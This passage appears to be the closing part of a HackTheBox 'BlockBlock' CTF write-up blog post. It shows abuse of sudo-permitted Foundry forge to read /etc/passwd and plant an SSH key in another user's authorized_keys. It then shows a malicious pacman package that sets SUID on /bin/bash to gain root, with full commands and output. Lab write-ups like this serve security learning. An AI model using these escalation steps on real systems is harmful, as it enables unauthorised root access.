class="number">8</span>c600caf991dd048b865a099838f40ae</span><br><span class="line">[<span class="type">keira</span>@<span class="type">blockblock</span> ~]<span class="variable">$</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation-to-root"><a href="#Privilege-Escalation-to-root" class="headerlink" title="Privilege Escalation to root"></a>Privilege Escalation to root</h3><h4 id="Lateral-Movement-to-Paul-Forge-abuse-to-arbitrary-file-write"><a href="#Lateral-Movement-to-Paul-Forge-abuse-to-arbitrary-file-write" class="headerlink" title="Lateral Movement to Paul - Forge abuse to arbitrary file write"></a>Lateral Movement to Paul - Forge abuse to arbitrary file write</h4><p>Checking what we can run with escalated privileges as Keira:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[keira@blockblock ~]$ sudo -l</span><br><span class="line">User keira may run the following commands on blockblock:</span><br><span class="line">    (paul : paul) NOPASSWD: /home/paul/.foundry/bin/forge</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we can run forge from Foundry which allows us to interact with Solidity Smart Contracts.</p>
+<p>One interesting feature of forge is the <code>flatten</code> command which flatten a source file and all of its imports into one file. Basically allowing us to read files.</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[keira@blockblock ~]$ sudo -u paul /home/paul/.foundry/bin/forge flatten /etc/passwd</span><br><span class="line">[⠃] Compiling...</span><br><span class="line">// /etc/passwd</span><br><span class="line">root:x:0:0::/root:/usr/bin/bash</span><br><span class="line">bin:x:1:1::/:/usr/bin/nologin</span><br><span class="line">daemon:x:2:2::/:/usr/bin/nologin</span><br><span class="line">mail:x:8:12::/var/spool/mail:/usr/bin/nologin</span><br><span class="line">ftp:x:14:11::/srv/ftp:/usr/bin/nologin</span><br><span class="line">http:x:33:33::/srv/http:/usr/bin/nologin</span><br><span class="line">nobody:x:65534:65534:Kernel Overflow User:/:/usr/bin/nologin</span><br><span class="line">dbus:x:81:81:System Message Bus:/:/usr/bin/nologin</span><br><span class="line">systemd-coredump:x:980:980:systemd Core Dumper:/:/usr/bin/nologin</span><br><span class="line">systemd-network:x:979:979:systemd Network Management:/:/usr/bin/nologin</span><br><span class="line">systemd-oom:x:978:978:systemd Userspace OOM Killer:/:/usr/bin/nologin</span><br><span class="line">systemd-journal-remote:x:977:977:systemd Journal Remote:/:/usr/bin/nologin</span><br><span class="line">systemd-resolve:x:976:976:systemd Resolver:/:/usr/bin/nologin</span><br><span class="line">systemd-timesync:x:975:975:systemd Time Synchronization:/:/usr/bin/nologin</span><br><span class="line">tss:x:974:974:tss user <span class="keyword">for</span> tpm2:/:/usr/bin/nologin</span><br><span class="line">uuidd:x:68:68::/:/usr/bin/nologin</span><br><span class="line">polkitd:x:102:102:User <span class="keyword">for</span> polkitd:/:/usr/bin/nologin</span><br><span class="line">avahi:x:973:973:Avahi mDNS/DNS-SD daemon:/:/usr/bin/nologin</span><br><span class="line">git:x:972:972:git daemon user:/:/usr/bin/git-shell</span><br><span class="line">keira:x:1000:1000::/home/keira:/bin/bash</span><br><span class="line">paul:x:1001:1001::/home/paul:/bin/bash</span><br><span class="line">dhcpcd:x:971:971:dhcpcd privilege separation:/:/usr/bin/nologin</span><br></pre></td></tr></table></figure></div>
+
+<p>For example we could read the <code>/etc/passwd</code> file.<br>And we could also output files contents into another file, which is when I thought of outputting my personal public key into paul’s <code>authorized_keys</code> file:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[keira@blockblock ~]$ sudo -u paul /home/paul/.foundry/bin/forge flatten  /tmp/kujen.pub</span><br><span class="line">[⠃] Compiling...</span><br><span class="line">// /tmp/kujen.pub</span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILj/fs7I8QFj+se4JCGfFdEr6IDtPR9w1FaBLPnjisMS 0xkujen@kujen</span><br><span class="line"></span><br><span class="line">[keira@blockblock ~]$ sudo -u paul /home/paul/.foundry/bin/forge flatten  /tmp/kujen.pub -o /home/paul/.ssh/authorized_keys</span><br><span class="line">[⠃] Compiling...</span><br><span class="line">Flattened file written at /home/paul/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></div>
+
+<p>And now trying to connect to paul through ssh:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; ssh paul@10.129.215.46</span><br><span class="line">[paul@blockblock ~]$ <span class="built_in">id</span></span><br><span class="line">uid=1001(paul) gid=1001(paul) <span class="built_in">groups</span>=1001(paul)</span><br></pre></td></tr></table></figure></div>
+
+<p>And we’re in!!</p>
+<h4 id="Final-Lateral-Movement-to-root-pacman-abuse"><a href="#Final-Lateral-Movement-to-root-pacman-abuse" class="headerlink" title="Final Lateral Movement to root - pacman abuse"></a>Final Lateral Movement to root - pacman abuse</h4><p>Checking what we can run as root:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[paul@blockblock ~]$ sudo -l</span><br><span class="line">User paul may run the following commands on blockblock:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/pacman</span><br></pre></td></tr></table></figure></div>
+
+<p>Doing some google searches on possible exploits for pacman, I stumbled upon this blog post <a class="link"   target="_blank" rel="noopener" href="https://thecybersimon.com/posts/Privilege-Escalation-via-Pacman/" >https://thecybersimon.com/posts/Privilege-Escalation-via-Pacman/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> detailing possible privesc techniques using pacman.<br>Basically we will be making a malicious pacman packages and providing it with a malicious .install script containing our privesc code (adding SUID to &#x2F;bin&#x2F;bash for example), then make the package and execue it using pacman to finally get root access:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[paul@blockblock ~]$ <span class="built_in">cd</span> /dev/shm</span><br><span class="line">[paul@blockblock shm]$ <span class="built_in">echo</span> -e <span class="string">&quot;pkgname=exp\npkgver=1.0\npkgrel=1\narch=(&#x27;any&#x27;)\ninstall=exp.install&quot;</span> &gt; PKGBUILD</span><br><span class="line">[paul@blockblock shm]$ <span class="built_in">echo</span> <span class="string">&quot;post_install() &#123; chmod 4777 /bin/bash; &#125;&quot;</span> &gt; exp.install</span><br><span class="line">[paul@blockblock shm]$ makepkg -s</span><br><span class="line">==&gt; Making package: exp 1.0-1 (Thu 27 Mar 2025 03:16:17 PM UTC)</span><br><span class="line">==&gt; Checking runtime dependencies...</span><br><span class="line">==&gt; Checking buildtime dependencies...</span><br><span class="line">==&gt; Retrieving sources...</span><br><span class="line">==&gt; Extracting sources...</span><br><span class="line">==&gt; Entering fakeroot environment...</span><br><span class="line">==&gt; Tidying install...</span><br><span class="line">  -&gt; Removing libtool files...</span><br><span class="line">  -&gt; Purging unwanted files...</span><br><span class="line">  -&gt; Removing static library files...</span><br><span class="line">  -&gt; Stripping unneeded symbols from binaries and libraries...</span><br><span class="line">  -&gt; Compressing man and info pages...</span><br><span class="line">==&gt; Checking <span class="keyword">for</span> packaging issues...</span><br><span class="line">==&gt; Creating package <span class="string">&quot;exp&quot;</span>...</span><br><span class="line">  -&gt; Generating .PKGINFO file...</span><br><span class="line">  -&gt; Generating .BUILDINFO file...</span><br><span class="line">  -&gt; Adding install file...</span><br><span class="line">  -&gt; Generating .MTREE file...</span><br><span class="line">  -&gt; Compressing package...</span><br><span class="line">==&gt; Leaving fakeroot environment.</span><br><span class="line">==&gt; Finished making: exp 1.0-1 (Thu 27 Mar 2025 03:16:19 PM UTC)</span><br><span class="line">[paul@blockblock shm]$ sudo pacman -U *.zst --noconfirm</span><br><span class="line">loading packages...</span><br><span class="line">resolving dependencies...</span><br><span class="line">looking <span class="keyword">for</span> conflicting packages...</span><br><span class="line"></span><br><span class="line">Packages (1) exp-1.0-1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:: Proceed with installation? [Y/n]</span><br><span class="line">(1/1) checking keys <span class="keyword">in</span> keyring                                                                [<span class="comment">#######################################################] 100%</span></span><br><span class="line">(1/1) checking package integrity                                                              [<span class="comment">#######################################################] 100%</span></span><br><span class="line">(1/1) loading package files                                                                   [<span class="comment">#######################################################] 100%</span></span><br><span class="line">(1/1) checking <span class="keyword">for</span> file conflicts                                                             [<span class="comment">#######################################################] 100%</span></span><br><span class="line">(1/1) checking available disk space                                                           [<span class="comment">#######################################################] 100%</span></span><br><span class="line">:: Processing package changes...</span><br><span class="line">(1/1) installing exp                                                                          [<span class="comment">#######################################################] 100%</span></span><br><span class="line">[paul@blockblock shm]$ <span class="built_in">ls</span> -al /bin/bash</span><br><span class="line">-rwsrwxrwx 1 root root 1112880 Jan 16  2024 /bin/bash</span><br><span class="line">[paul@blockblock shm]$ bash -p</span><br><span class="line">bash-5.2<span class="comment"># id</span></span><br><span class="line">uid=1001(paul) gid=1001(paul) euid=0(root) <span class="built_in">groups</span>=1001(paul)</span><br><span class="line">bash-5.2<span class="comment"># cat /root/root.txt</span></span><br><span class="line">906da069d604a677968add4838613a8e</span><br></pre></td></tr></table></figure></div>
+
+<p>And that was basically it for BlockBlock. Hope you enjoyed it!</p>
+<p>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: BlockBlock</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-03-27 15:07:15</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-03-28 06:31:12
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/03/27/Hackthebox-BlockBlock/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/03/21/Hackthebox-Alert/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Alert</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: BlockBlock</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-10-129-215-46"><span class="nav-text">Web Application - http:&#x2F;&#x2F;10.129.215.46 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-to-root"><span class="nav-text">Privilege Escalation to root</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
